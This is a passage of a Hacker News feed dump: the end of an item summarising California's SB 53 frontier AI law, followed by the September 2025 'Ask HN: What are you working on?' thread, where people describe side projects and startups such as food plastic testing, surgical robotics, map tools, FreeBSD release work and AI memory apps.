    &lt;p&gt;Jennifer Tour Chayes&lt;lb/&gt;Dean of the College of Computing, Data Science, and Society at UC Berkeley&lt;/p&gt;
    &lt;head rend="h2"&gt;California’s AI dominance&lt;/head&gt;
    &lt;p&gt;California continues to dominate the AI sector. In addition to being the birthplace of AI, the state is home to 32 of the 50 top AI companies worldwide. California leads U.S. demand for AI talent. In 2024, 15.7% of all U.S. AI job postings were in California — #1 by state, well ahead of Texas (8.8% and New York (5.8%), per the 2025 Stanford AI Index. In 2024, more than half of global VC funding for AI and machine learning startups went to companies in the Bay Area. California is also home to three of the four companies that have passed the $3 trillion valuation mark. Each of these California-based companies — Google, Apple, and Nvidia — are tech companies involved in AI and have created hundreds of thousands of jobs.&lt;/p&gt;
    &lt;head rend="h2"&gt;What the law does:&lt;/head&gt;
    &lt;p&gt;SB 53 establishes new requirements for frontier AI developers creating stronger:&lt;/p&gt;
    &lt;p&gt;✅ Transparency: Requires large frontier developers to publicly publish a framework on its website describing how the company has incorporated national standards, international standards, and industry-consensus best practices into its frontier AI framework.&lt;/p&gt;
    &lt;p&gt;✅ Innovation: Establishes a new consortium within the Government Operations Agency to develop a framework for creating a public computing cluster. The consortium, called CalCompute, will advance the development and deployment of artificial intelligence that is safe, ethical, equitable, and sustainable by fostering research and innovation.&lt;/p&gt;
    &lt;p&gt;✅ Safety: Creates a new mechanism for frontier AI companies and the public to report potential critical safety incidents to California’s Office of Emergency Services.&lt;/p&gt;
    &lt;p&gt;✅ Accountability: Protects whistleblowers who disclose significant health and safety risks posed by frontier models, and creates a civil penalty for noncompliance, enforceable by the Attorney General’s office.&lt;/p&gt;
    &lt;p&gt;✅ Responsiveness: Directs the California Department of Technology to annually recommend appropriate updates to the law based on multistakeholder input, technological developments, and international standards.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45418428</guid><pubDate>Mon, 29 Sep 2025 20:33:14 +0000</pubDate></item><item><title>Ask HN: What are you working on? (September 2025)</title><link>https://news.ycombinator.com/item?id=45418675</link><description>&lt;doc fingerprint="b748915139a79ab8"&gt;
  &lt;main&gt;
    &lt;p&gt;Last year PlasticList discovered that 86% of food products they tested contain plastic chemicals—including 100% of baby food tested. The EU just lowered their "safe" BPA limit by 20,000x. Meanwhile, the FDA allows levels 100x higher than what Europe considers safe.&lt;/p&gt;
    &lt;p&gt;This seemed like a solvable problem.&lt;/p&gt;
    &lt;p&gt;Laboratory.love lets you crowdfund independent testing of specific products you actually buy. Think Consumer Reports meets Kickstarter, but focused on detecting endocrine disruptors in your yogurt, your kid's snacks, whatever you're curious about.&lt;/p&gt;
    &lt;p&gt;Here's how it works: Find a product (or suggest one), contribute to its testing fund, get detailed lab results when testing completes. If a product doesn't reach its funding goal within 365 days, automatic refund. All results are published openly. Laboratory.love uses the same methodology as PlasticList.org, which found plastic chemicals in everything from prenatal vitamins to ice cream. But instead of researchers choosing what to test, you do.&lt;/p&gt;
    &lt;p&gt;The bigger picture: Companies respond to market pressure. Transparency creates that pressure. When consumers have data, supply chains get cleaner.&lt;/p&gt;
    &lt;p&gt;Technical details: Laboratory.love works with ISO 17025-accredited labs, test three samples from different production lots, detect chemicals down to parts per billion. The testing protocol is public.&lt;/p&gt;
    &lt;p&gt;So far a couple dozen products have received some funding, six products have been fully funded (five product results published, the sixth is at the lab as I write this!)&lt;/p&gt;
    &lt;p&gt;You can browse products, add your own, or just follow specific items you're curious about: https://laboratory.love&lt;/p&gt;
    &lt;p&gt;Looking at the tofu reports, I really don't know what to make of them. Is there a way to give more meaning to them for the average person? Also, I'd love to see a sort by "almost funded" option.&lt;/p&gt;
    &lt;p&gt;I love this idea. I imagine it could be extended to other types of testing - for example, I've always wished there was a way to more readily verify whether the contents of vitamins were as specified on the label.&lt;/p&gt;
    &lt;p&gt;I LOVE this idea. Tangentially, a more pimitive case: in trying to recycle or reuse jars or carboard containers food comes in, I wish there was a simple service for ranking brands. For example, some jam jars have labels that can be immediatey removed - others tear and stick to the jar. Similarly, some brands use excessive plastics and packaging, others less so.&lt;/p&gt;
    &lt;p&gt;This is great. I thought about a different model even before plasticlist: make a subscription and test various products, but people will have a number of upvotes based on their sub streak. They vote for food to test, and then you show results to everyone subbed. Kind of like what examined does, but they do deep dives into medical topics for subs. I think this model will work better than the one you currently have. Awesome project anyways!&lt;/p&gt;
    &lt;p&gt;It is extremely weird to me that countries don't do that on taxpayers money and show the results publicly, this is what they should do.&lt;/p&gt;
    &lt;p&gt;I definitely considered a voting mechanism, but there are a few million active, buyable CPG UPCs in the U.S. at any given time. When conducting some basic market research for this project, I found that most people are only willing to pay to find results about the specific products they care about.&lt;/p&gt;
    &lt;p&gt;What would be a good strategy to prevent companies from cottoning on to this and gaming the system? They could for example change packaging on production runs for a product that’s undergoing laboratory.love funding campaign.&lt;/p&gt;
    &lt;p&gt;It's an interesting thought. Companies do change packaging somewhat regularly. However, the underlying skew usually remains the same. Changing the packaging and/or the SKU is very expensive. It's probably cheaper and more beneficial to your company to do your own Plastic Chemical testing and get ahead of the problem.&lt;/p&gt;
    &lt;p&gt;My suspicion is if this was gameable, this would be a solved problem by a number of companies. The truth is there is no single simple or even hard step to take, it’s mostly like numerous steps that multiple actors would need to do.&lt;/p&gt;
    &lt;p&gt;React + Vite + Tailwind on the frontend; Netlify Functions for backend with Stripe, Supabase, and email integrations; content via Markdown build script; deployed on Netlify; linted with ESLint; JavaScript-only codebase&lt;/p&gt;
    &lt;p&gt;The product label images loading on the homepage are huge right now. They are displayed in 128px * 128px box but are about 2 MB in size each. May be generate resized versions at build time and use &amp;lt;picture&amp;gt; tags?&lt;/p&gt;
    &lt;p&gt;This is so incredibly important, well done. The problem of our food being steeped in plastic hits the news here and there, but it should be front and center in my opinion. Testosterone has been plummeting for decades and it scares the heck out of me. The hormone whose job is "form goals, shrug off failure, and try again!" is being destroyed and corporations are given a free pass to pump us full of phthalates and bisphenol. It's infuriating.&lt;/p&gt;
    &lt;p&gt;And anecdotally, I've still been forming goals and shrugging off failure five years into suppressing most of my endogenous testosterone with exogenous estrogen&lt;/p&gt;
    &lt;p&gt;Well that's great for you, but I was making a generalized statement about the role of testosterone, scientific data showing huge decline, and more and more studies linking it to plastics. We can't just alter a key hormone within the span of a few decades and shrug it off. My levels are great for a 40 year old&lt;/p&gt;
    &lt;p&gt;And yes there are certainly other factors, but that's not what the original comment was talking about?&lt;/p&gt;
    &lt;p&gt;I'm working on a system that helps surgeons make precise bone cuts during knee replacement surgery. Believe it or not, manual cuts are still the standard in that type of procedure. Robotic systems exist but they are very costly, big, and actually add time to the surgery (bad news when you are under anesthesia and your leg is in a tourniquet).&lt;/p&gt;
    &lt;p&gt;It uses 4k stereoscopic capture and bunch of ML models to match bone position with sub-millimeter precision. The surgeon screws a metal base piece into the bone, and we detect where that is in space. Then, a Stewart Platform adjusts another part that is placed onto the base. The robotic adjustment allows the base to be placed in a ballpark area, with the robotically-adjusted piece oriented in the exact spot where the surgeon needs to cut.&lt;/p&gt;
    &lt;p&gt;The net result is a robotic system that is many times cheaper than the least expensive incumbent, decreases surgery time significantly, reduces error, and basically "just works" as opposed to requiring a ton of training. We are debuting at a tradeshow in October.&lt;/p&gt;
    &lt;p&gt;This sounds awesome! Can you tell me more about what kind of expertise do you need to develop such a system? As in the most important knowledge one most have to be able to work on such a thing&lt;/p&gt;
    &lt;p&gt;Hobby. Very rudimentary, not everything working yet.&lt;/p&gt;
    &lt;p&gt;Think ansible for your user account (except it will definitely not be ansible for your user account).&lt;/p&gt;
    &lt;p&gt;Whenever I have a new machine, I do the same steps over and over again:&lt;/p&gt;
    &lt;p&gt;- Installing some packages (like make)&lt;/p&gt;
    &lt;p&gt;- Setting up an ssh key&lt;/p&gt;
    &lt;p&gt;- Cloning some git repositories&lt;/p&gt;
    &lt;p&gt;- Setting up dotfiles&lt;/p&gt;
    &lt;p&gt;- Installing rustup / rust&lt;/p&gt;
    &lt;p&gt;- …&lt;/p&gt;
    &lt;p&gt;Until recently I tried doing all of that with a bunch of bash-scripts, but that turned out to be messy and not a joy to maintain. So now tried a slightly different angle with a rust tool that you can just pull out of the CI, no dependencies, and it will setup everything (for me).&lt;/p&gt;
    &lt;p&gt;This is a solo startup that I've been working on for 2 years now. It's a labor of love and I'm very lucky and thankful that it's big enough to surprisingly pay all of our bills. Still constantly feeling FOMO over all of my startup buddies working with AI and LLMs while I plug away at old maps and GIS .&lt;/p&gt;
    &lt;p&gt;It gets ~80K MAUs and just slowly and consistently is growing organically through word of mouth through history focused communities. I'm currently playing with expanding the coverage internationally as I still only support the US which is a wickedly fun project.&lt;/p&gt;
    &lt;p&gt;Really cool! I built the website for an antique maps dealer (Dat Narrenschip) when I was 15 or so and fell in love with antique maps. It's still up and running but now on Shopify.&lt;/p&gt;
    &lt;p&gt;Over the years I experimented a bit with leaflet.js and thought of overlaying maps too so you can navigate maps through time, but quickly realized it was super difficult. Kudos for setting this up!&lt;/p&gt;
    &lt;p&gt;If you want to expand to other regions, or chat, or get access to high-res scans, let me know.&lt;/p&gt;
    &lt;p&gt;I got into it because I was interested in the technical challenge of registering GPS to maps which are very warped compared to reality, like very old maps or illustrated tourist maps.&lt;/p&gt;
    &lt;p&gt;Nice project! The National Library of Scotland has a nifty tool focused mainly on the UK and Ireland that does something similar (with a paid print service attached): https://maps.nls.uk/geo/find/marker/&lt;/p&gt;
    &lt;p&gt;That's nice! I have some GIS data of my country it was pretty detailed, it may be outdated now, but covered a good amount of administrative details. If you are extending and need some data on Bangladesh, I can send you&lt;/p&gt;
    &lt;p&gt;Have you looked into speaking with the various SHPOs in each US State/Territory?&lt;/p&gt;
    &lt;p&gt;I've worked with several of them a fair bit and they have a ton of old maps hidden internally. Especially for small, specific areas of the state, like historical districts.&lt;/p&gt;
    &lt;p&gt;I'm working on Small Transfers (https://smalltransfers.com/), a payment platform that makes it very convenient for SaaS / API makers to provide a pay-as-you-go model to their customers.&lt;/p&gt;
    &lt;p&gt;You can charge as little as 0.000001 USD per request. The platform uses our own system for tracking usage, which is settled through Stripe. No crypto, tokens, or wallets.&lt;/p&gt;
    &lt;p&gt;If combined with subscriptions, the pricing can work similarly to mobile plans, where monthly plans become cheaper above a certain usage threshold.&lt;/p&gt;
    &lt;p&gt;Looking for more developers to try it and share feedback.&lt;/p&gt;
    &lt;p&gt;Customers do create an account and provide a payment method, but they don't pre-fund or hold a balance, and they don't initiate a payment. Small Transfers is an API that allows merchants to charge very small amounts programmatically. At the end of each month (or earlier, if a threshold is reached), we charge the customer what they owe. This makes the tiny charges viable and avoids death-by-$0.30.&lt;/p&gt;
    &lt;p&gt;It's not a PayPal remake, since there are no wallets, no P2P transactions, and no stored funds. In addition, Small Transfers allows very small charges (as mentioned above), and provides customer OAuth and spending caps.&lt;/p&gt;
    &lt;p&gt;Business Name Generator Generate memorable, brandable business names using advanced AI technology. Get domain availability and social media username checks instantly.&lt;/p&gt;
    &lt;p&gt;Working on orbital dynamics code for my PhD in astronomy, written in rust, it can accurately calculate the positions of all asteroids/comets to within a few meters. Today I am adding a new numerical integration method which should enable me to predict orbits from observations.&lt;/p&gt;
    &lt;p&gt;I’m working on an ISBN database that fetches information from several other services, such as Hardcover.app, Google Books, and ISBNDB, merges that information, and return something more complete than using them alone. It also saves that information in the database for future lookups.&lt;/p&gt;
    &lt;p&gt;Mostly because I’m working on a personal library management service called Shelvica to solve my own problems[1], and none of those services provided all the information on a book. One might provide the series, the other might provide genres, and yet another might provide a cover with good dimensions, but none provided everything, so I decided to work on something of my own (called Librario).&lt;/p&gt;
    &lt;p&gt;While Shelvica is the focus, Librario could become its own thing in time, so I don’t mind the sidetracking.&lt;/p&gt;
    &lt;p&gt;I also plan on having a “ISBN Search” kind of website that feeds from that database as a way to let users search for information about books, which then feeds the service’s database, making it stronger for Shelvica.&lt;/p&gt;
    &lt;p&gt;I open source everything I make, but I’m still wondering if these will be open sourced or not. I’ll probably go with the EUPL 1.2 license if I do decide on open sourcing them.&lt;/p&gt;
    &lt;p&gt;[1]: My wife and I have a personal library with around 1800 books, but most applications for management are either focused on ebooks or choke with this many books. Libib is the exception, but I wanted a little more.&lt;/p&gt;
    &lt;p&gt;Didn’t have the time yet, but it’s on my todo list. I have extractors for Google Books, Hardcover.app, and ISBNDB already working, and Amazon, Goodreads, and Anna’s Archive in the todo list.&lt;/p&gt;
    &lt;p&gt;I do plan on including a link to the book on Anna’s Archive in the “ISBN Search” website. At least to the search page with the filters already filled.&lt;/p&gt;
    &lt;p&gt;Hey I'd like to learn more about what you're doing. I'm working on a tangentially related service but focusing on audiobooks. One big stumbling block I ran into early on was trying to find something close to a unified ISBN datasource.&lt;/p&gt;
    &lt;p&gt;If you're up for it, shoot me an email at charles@geuis.com.&lt;/p&gt;
    &lt;p&gt;I attempted something like this because I wanted a good books search service which provided me at-a-glance information I needed from Storygraph &amp;amp; Goodreads. The main things I look for when I search a book is genres/Storygraph's "moods", number of pages, whether it's part of a series, rating across services &amp;amp; how much does it cost.&lt;/p&gt;
    &lt;p&gt;The next steps are to create more schematics with Circuitscript as examples to test the limitations of the language and to generate PCB designs with KiCAD. The Circuitscript tool (currently only the desktop cli tool) is able to generate KiCAD netlists and this can be imported into PCBnew.&lt;/p&gt;
    &lt;p&gt;The motivation for creating Circuitscript is to describe schematics in terms of code rather than graphical UIs after using different CAD packages extensively (Allegro, Altium, KiCAD) in the past. I wanted to spend more time thinking about the schematic design itself rather than fiddling around with GUIs.&lt;/p&gt;
    &lt;p&gt;The main language goals are to be easy to write and reason, generated graphical schematics should be displayed according to how the designer wishes so (because this is also part of the design process) and to encourage code reuse.&lt;/p&gt;
    &lt;p&gt;Please check it out and I look forward to your feedback, especially from electronics designers/hobbyists. Thanks!&lt;/p&gt;
    &lt;p&gt;As a big openscad fan I love the idea of designing circuits with code.&lt;/p&gt;
    &lt;p&gt;I do wonder though about designing circuits vs designing schematics. I see you have ‘wire down 100’ making it a more visual language than defining the nets. Be interesting to separate the schematic layout from the nets, so rule base schematic layout can then be applied.&lt;/p&gt;
    &lt;p&gt;I've been working on a tool to add long term memory to various AI tools. It started last year as a small scratch-your-own-itch side project. After using ChatGPT Plus for a month, I went back to TypingMind, my go-to AI client at the time, but I really missed the memory feature and wanted it there. So I made a simple memory plugin for it.&lt;/p&gt;
    &lt;p&gt;Over time, the project has grown to now support more than 17 platforms, thousands of users, and has been growing organically.&lt;/p&gt;
    &lt;p&gt;As of most recently a major feature I've been working on is full chat history based memory. Being able to remember and recall every conversation you've ever had across multiple supported AI tools, similar to the reference past conversations feature in various AI apps. This has been pretty intense and fun. Ingesting tens of millions of tokens per user, and doing complex multi-stage RAG on-the-fly across this vast dataset with a tight latency target for UX.&lt;/p&gt;
    &lt;p&gt;Another project is a RAG app that's built specifically for books. No "we work with your receipts, and legal documents, instruction manuals, product documentation, lecture transcripts, your dogs novel, the script for a play and everything else possible". I wanted something tailored for books, specifically, non-fiction books. When you try to work everywhere, you can not deliver an amazing experience for any one specific use case. AskLibrary is tailored for non-fiction books, so everything from the answer generation pipelines, to the ingestion pipeline, and various other features are all designed for this specific use case. https://www.asklibrary.ai&lt;/p&gt;
    &lt;p&gt;I'm super curious if anybody will pick it up and do something useful with it. This was a couple of years of my life and I absolutely loved working on it but having a child put a hard stop to such entertainment for many years. Now, a good 30 years later I finally found the time to resurrect it.&lt;/p&gt;
    &lt;p&gt;I'm not sure yet if I am going to do more work on it or leave it as it is, it's good enough to give someone new to OS development a running start and a foundation to build on.&lt;/p&gt;
    &lt;p&gt;In 2023 a friend and I started a monthly dinner club with the goal of eating around the world without getting on a plane. We gather once a month at a restaurant on Long Island for a meal focused on a theme or region of the world. The meals are around 10+ courses and include a drink. We work with the restaurant to craft a menu that is as close to authentic to the region as possible.&lt;/p&gt;
    &lt;p&gt;Our first dinner was with 13 friends and has since grown into a group of just about 1,000 members. Last year we generated around $140k for local restaurants on off nights (dinners are on Tues and Wed when business is slow).&lt;/p&gt;
    &lt;p&gt;Now we are working on evolving into more of a lifestyle brand for people who love food. I'm currently working on our clothing line and new site, which we quietly launched a few days ago (there's still a few odds and ends to finish): https://www.deadchefssociety.com. Would love any feedback!&lt;/p&gt;
    &lt;p&gt;That's such a great idea. Especially since you're also helping the restaurants out. Nowhere near that area otherwise I would've petitioned straight away&lt;/p&gt;
    &lt;p&gt;I've been working on a 3D voxel-based game engine for like 10 years in my spare time. The most recent big job has been to port the world gen and editor to the GPU, which has had some pretty cute knock-on effects. The most interesting is you can hot-reload the world gen shaders and out pop your changes on the screen, like a voxel version of shadertoy.&lt;/p&gt;
    &lt;p&gt;I also wrote a metaprogramming language which generates a lot of the editor UI for the engine. It's a bespoke C parser that supports a small subset of C++, which is exposed to the user through a 'scripting-like' language you embed directly in your source files. I wrote it as a replacement for C++ templates and in my completely unbiased opinion it is WAY better.&lt;/p&gt;
    &lt;p&gt;That is so neat. I built something a little bit like this for a simulator of a 3D portal mill. Trying it on real wood got expensive fast so for debugging runs and trials of designs I would run a simulation where the toolbit would hack out the shape out of a three dimensional array of voxels. This was then displayed using a very simple engine built with PyGame. I got a lot of use out of that and it saved days (and a small forest).&lt;/p&gt;
    &lt;p&gt;Great to see something along those lines but with much better visuals.&lt;/p&gt;
    &lt;p&gt;I read a paper called "The Rise of Subagents" by Phil Schmid at https://www.philschmid.de/the-rise-of-subagents and thought it was an incredibly powerful architectural pattern for running AI agents with complex tasks.&lt;/p&gt;
    &lt;p&gt;So, I decided to build a practical implementation of this system with a central Orchestrator that manages a fleet of implicit or explicit Subagents. Each subagent is a specialized, isolated AI agent designed to perform a specific subtask. More details in the repo README at https://github.com/skanga/conductor&lt;/p&gt;
    &lt;p&gt;It prioritizes accessibility, longevity, performance, and simplicity.&lt;/p&gt;
    &lt;p&gt;With the autoloader, one script tag loads components dynamically without downloading the entire library. (npm also available.)&lt;/p&gt;
    &lt;p&gt;Theming uses color-mix() and OKLAB to create uniform color palettes from a single CSS property. Adaptive palettes are used for dark mode.&lt;/p&gt;
    &lt;p&gt;All form controls are form-associated via ElementInternals and work with native validation APIs (required, pattern, etc.).&lt;/p&gt;
    &lt;p&gt;Dialogs, popovers, tooltips, etc. use Popover API for top-layer access without having to portal or hoist.&lt;/p&gt;
    &lt;p&gt;Some of the more fun components include: Joystick, Stamp, Mesh Gradient, Flip Card, Random Content, Intersection Observer, Typewriter, Lorem Ipsum, Slide Activator&lt;/p&gt;
    &lt;p&gt;The library is free for personal, educational, non-profit use. Commercial use requires a license.&lt;/p&gt;
    &lt;p&gt;I’m working on https://onebliq.com A lightweight service for Azure cost visibility.&lt;/p&gt;
    &lt;p&gt;The idea is simple: * See where your Azure spend is going, without learning all the ins and outs of Azure Cost Management. * Get alerts when something unusual happens, with the root cause explained right away.&lt;/p&gt;
    &lt;p&gt;Still in preview, so I’m mostly looking for feedback from people who deal with Azure day to day. Early access is available if you want to try it!&lt;/p&gt;
    &lt;p&gt;I'm working on Typegres, a new data layer for the modern stack (TypeScript + PostgreSQL).&lt;/p&gt;
    &lt;p&gt;My take is that for years, ORMs have hidden the power of PostgreSQL behind generic, database-agnostic abstractions. This made sense in 2010, but now it's a bottleneck.&lt;/p&gt;
    &lt;p&gt;Typegres rejects this. It's a "translator, not an abstraction," designed to express the full power of PostgreSQL (all statements, built-in functions, etc.) in a type-safe TypeScript API.&lt;/p&gt;
    &lt;p&gt;The latest killer feature my take of "object-relational mapping done right": class-based models with methods that are actually composable SQL expressions. This lets you extend your tables with expressive logic and fully-composable relations.&lt;/p&gt;
    &lt;p&gt;Since last year i've been working on something that surprisingly didn't exist before, an app where you can rate sports games.&lt;/p&gt;
    &lt;p&gt;https://rategame.io/ and on the app stores(I really recommend the app if you want to check it out, especially on a phone)&lt;/p&gt;
    &lt;p&gt;We've expanded on the concept with rating stadiums, creating lists, voting for player of the game and more as we are trying to become the letterboxd for sports.&lt;/p&gt;
    &lt;p&gt;In the last 7 days I implemented a complete XPath 1.0 parser &amp;amp; evaluation system from scratch in C++20. Right now I'm adding support for XPath 2.0.&lt;/p&gt;
    &lt;p&gt;Codex in the cloud has been leveraged to do 95% of the work and Claude 5%. We've output 10.5K LoC and 774 individual tests to ensure compliance to the spec.&lt;/p&gt;
    &lt;p&gt;Lately I've been feeling like we're living firmly in the future. This would easily be an 8+ month project on my own not including the tests, yet we're now on track for completion in 10 days. A min. 25x speed increase is a crazy level of productivity for me and it's hard to believe I'm still seeing articles claiming that AI coding isn't productive.&lt;/p&gt;
    &lt;p&gt;Working on a webapp for critically think with others about a problem.&lt;/p&gt;
    &lt;p&gt;The idea is that you build a diagram that contains all the details about the problem and people's thoughts on it, and it's organized in such a way that it's easy to just keep refining, down to the smallest detail. So you build this concrete, shared understanding, and move it forward and forward, until hopefully y'all can make some best decision to improve the situation.&lt;/p&gt;
    &lt;p&gt;There's a lot to do. Currently working on UX to allow hiding intermediate nodes and still have indirect edges drawn. Want to add an LLM integration to generate/update diagrams via natural language, which I think will help a lot with usage barriers to using the app.&lt;/p&gt;
    &lt;p&gt;I wanted something similar for a worldview. I want an app where I can dump all the things that actively go into shaping my worldview and then when someone wants to know why I think the way I do, I will share them the link of my worldview board. We are not famous people to have our memoir written but this is another way to peek into minds of strangers.&lt;/p&gt;
    &lt;p&gt;That's a cool idea. Seems like there would be a ton of things contained in an individual's worldview, that it'd be hard to build all of it up. Perhaps when you encounter something that makes you think of some core philosophy, you note it and the philosophy, and eventually there would be a loose picture that forms amongst all the relations.&lt;/p&gt;
    &lt;p&gt;Certainly would be helpful for trying to understand someone else. Not sure if this is totally appropriate, but it does seem like something that a chatbot would be good at combing through to find examples to suggest why one thinks a certain way about a new topic. You could even ask it about your own worldview!&lt;/p&gt;
    &lt;p&gt;Building an iOS app for metronome sequencing to get faster at playing guitar and reaching "shred" speeds at different subdivisions/time signatures in a single sequence. Planning on adding accuracy indicators and scoring so rushing or dragging can be easily identified when finishing a saved routine. I.e., some post-routine metrics.&lt;/p&gt;
    &lt;p&gt;I've been playing guitar for a little under 6 years and ran into the common problem among many intermediate guitarists fall into, which is stagnating into a plateau at a certain BPM.&lt;/p&gt;
    &lt;p&gt;The most effective solution I've found is to take the top speed hit playing a chunk of a lick and simply increase it 20-50 BPM past that limit, attempting one's best to stay in tempo. Regardless of how sloppy it sounds. Then roughly halve that increased addition of BPM, it will become relatively easier to play. For example, if you are stuck at 120 BPM, upping it to 150 BPM with sloppy attempts, then dropping it back down to 130-140 BPM.&lt;/p&gt;
    &lt;p&gt;I've gone cleanly from alternate picked 140 BPM triplets to 220 BPM triplets in two months after being stuck at 140 BPM for over a year with this method. Sometimes even hitting 280 BPM triplets when I have the focus and time for it.&lt;/p&gt;
    &lt;p&gt;Even then, I want a more consistent, and variable way of customizing a practice session using a metronome from a hobbyist perspective without using a DAW. With a simpler interface for doing so. As well as encourage with said method above for other guitarists in the pursuit of speed.&lt;/p&gt;
    &lt;p&gt;Great instructional video. First place I learned E natural minor with his scale fragments section.&lt;/p&gt;
    &lt;p&gt;Yes, not a new technique by any stretch of the means. AFAIK John Petrucci takes a less aggressive approach with raising BPM. Funnily, Shawn Lane goes into a very similar methodology &amp;gt;30 years ago[1].&lt;/p&gt;
    &lt;p&gt;At least a couple more weeks. Hopefully less than a month out from now.&lt;/p&gt;
    &lt;p&gt;I have most of the UI done for sequencing. Workflows for speed building and metronome sequencing will be completely free, which is also a top priority for me to get out the door first.&lt;/p&gt;
    &lt;p&gt;I'm creating Comper, an infinite canvas that has all your organization's code and documentation on it. If you zoom in, you can see the code, if you zoom out you see the big picture. By giving everything a place on the map, it becomes easier to figure out your way through the landscape and understand the systems. Different modes can you show you different things: code age, authorship (bus-factor, is the person still with the company etc), languages used, security issues. There's time-travel, think Gource for all software in your company, and maybe the most fun: a GeoGuessr for code. Select the repos for your team (or if you feel confident, of the entire org), you get a snippet and have to guess where it is. The plan is for LLMs + tree-sitter to analyze all the code and show relations to other systems, databases etc.&lt;/p&gt;
    &lt;p&gt;My initial announcement got the top spot in "What are you working on? (February 2025)" https://news.ycombinator.com/item?id=43157056 but now I'm a lot further, there's a website https://comper.io and the company is getting incorporated within two weeks.&lt;/p&gt;
    &lt;p&gt;Last week I showed it off in the Feeling of Computing Meetup (fka Future of Coding) - the recording is here and the reactions were extremely positive https://www.youtube.com/watch?v=3-rg-FPZJtk&lt;/p&gt;
    &lt;p&gt;I'm opening the private beta soon, where I mix using the product with consultancy, to get better customer feedback. Not sure if that will work, but I don't have all the features yet for bottom-up adoption.&lt;/p&gt;
    &lt;p&gt;Uncaught (in promise) DOMException: The fetching process for the media resource was aborted by the user agent at the user's request. Uncaught (in promise) DOMException: The media resource indicated by the src attribute or assigned media provider object was not suitable.&lt;/p&gt;
    &lt;p&gt;No video with supported format and MIME type found.&lt;/p&gt;
    &lt;p&gt;On the side, custom coloring books for kids using nano banana, started with a project for my son, and its a little janky for some photos but have had some interest already: https://bespokebooks.io. I think it needs to be a phone app to really work for most people though, so that's next on my to do list besides some prompt tweaking.&lt;/p&gt;
    &lt;p&gt;I think there are a lot of really fun projects possible now in the child book creation space, particularly as you build tools that they can use themselves (like adding voice interfaces to building a book or story).&lt;/p&gt;
    &lt;p&gt;This is outside my 996 job of AI Agent/Assistant infra + ops :)&lt;/p&gt;
    &lt;p&gt;I'm currently building Visirya, an app that helps people record their night dreams and transforms them into short videos and written journals. The bigger goal is to use this dream data to create dream cartographies, essentially maps of recurring themes, emotions, and symbols—to uncover patterns and insights across dreams over time.&lt;/p&gt;
    &lt;p&gt;So far, we've built the video generation and dream journaling features. The app is live on TestFlight, and we're preparing a major update soon that includes a new better UI, and dream questionnaire to help with pattern recognition and dream mapping.&lt;/p&gt;
    &lt;p&gt;Would love to hear thoughts, feedback, or connect with others working on similar intersections of tech and the mind! If you're interested in trying it out, you can find the TestFlight link on our website: https://visirya.com&lt;/p&gt;
    &lt;p&gt;The idea is nice, but I wonder if a generated video can have any resemblance of the actual dream. At least for me, dreams are very tied to emotion, and the visuals are kinda blurry, so i don’t know if that sort of thing can provide any satisfaction. But I know certain aesthetics can feel “dreamlike”.&lt;/p&gt;
    &lt;p&gt;Super cool! I'm building in the same space but for Muslims - Dreamstate: Interpret your dreams Islamically https://dreamstateai.replit.app/&lt;/p&gt;
    &lt;p&gt;I tried your app - it's quite abrupt to go straight to Access Microphone permissions. The voice recording took a long time to analyse, it timed out for me. It's a great idea but didn't work for me unfortunately.&lt;/p&gt;
    &lt;p&gt;Very much a hobby, but I'm working on a Pinterest alternative built on ATProto called Scrapboard[1]&lt;/p&gt;
    &lt;p&gt;The Bluesky ecosystem is a really great platform to build social media on and with Pinterest being overtaken by AI content I figured I'd give it a shot. There is definitely not as much content there, but it is of much higher quality and the culture of providing alt text on images really makes search work rather well.&lt;/p&gt;
    &lt;p&gt;I'm working on a new unconventional form of computing called "temporal computing" - as both a PhD and as a fledgling business. The idea is to use delays in time (It's called interval modulation) as the data. I have a video explainer on YouTube https://youtu.be/rXbzJxThgig?si=FYMleAgZ0GMNEqk9. It's a long road building your own computational model and I'm currently looking at Turing completeness, and models of multiplication.&lt;/p&gt;
    &lt;p&gt;Release engineering for FreeBSD 15.0-RELEASE. Major releases are always a lot of work, but this is probably the biggest release in 20 years due to the new base system distribution system landing. (We're switching from "here's a tarball containing everything" to "here's 500 packages", with resulting changes in the build process, download/update mirrors, installer, etc.)&lt;/p&gt;
    &lt;p&gt;Given that this is a major release, there are fairly wide error bars on that; it could be as much as 3 weeks earlier if the first release candidate turns out to be perfect, and of course it could be later if things go badly (but I very much hope to get it out by the end of 2025).&lt;/p&gt;
    &lt;p&gt;Definitely a massive job. Some FreeBSD developers have stepped up to volunteer tremendous amounts of help (and also the FreeBSD Foundation has paid staff helping out with parts of this) but my best guess is that I'll be spending around 300 unpaid hours making this release happen; I've been doing pretty much full time hours on this in September and I'm really hoping that once pkgbase moves from "need to implement the stuff which isn't implemented yet" to "need to iron out some bugs" I'll have time for other things... like my paid job, Tarsnap.&lt;/p&gt;
    &lt;p&gt;A Civil 3D plugin (Genabler) that will include all the network catalogs and collate the Civil 3D styles for civil engineers to use.&lt;/p&gt;
    &lt;p&gt;There are some out-of-the-box catalogs and styles shipped with the default installation, but they are quite limited and fairly well hidden—which is not surprising, given that Civil 3D is a huge beast. As a result, they are not commonly used.&lt;/p&gt;
    &lt;p&gt;When people think about Civil 3D, they often assume it requires BIM modelers (in a sense, just glorified drafters) to create all the necessary catalogs and styles, and to assist with their use.&lt;/p&gt;
    &lt;p&gt;My Civil 3D plugin will:&lt;/p&gt;
    &lt;p&gt;1. Make standard, market-compliant catalogs and polished styles available to engineers at large. Think of it as the WordPress theme provider equivalent.&lt;/p&gt;
    &lt;p&gt;2. Make the entire process easy and painless through the plugin, with prominent buttons for quick access.&lt;/p&gt;
    &lt;p&gt;If the plugin is done well, there will be less need for BIM modelers, since for a fee, engineers could simply purchase catalogs and styles that are so easy to use they require no technical training.&lt;/p&gt;
    &lt;p&gt;As a side benefit, I also get to explore how LLMs can help me write code. It has been a while since I last updated my AI usage policy [0], and I look forward to revisiting it.&lt;/p&gt;
    &lt;p&gt;Building an app where 1 pushup = 1 minute of scrolling allowed [1]. We've fiiinally started to grow and reached a whooping $30k in the last month!!&lt;/p&gt;
    &lt;p&gt;I was literally thinking about quitting in August. My motivation is now at an all-time high - some users have done &amp;gt;8k pushups :)&lt;/p&gt;
    &lt;p&gt;As always, the key has been the marketing (10M views on Instagram). But we have to improve the product to make people love it even more. So the roadmap is more full than ever.&lt;/p&gt;
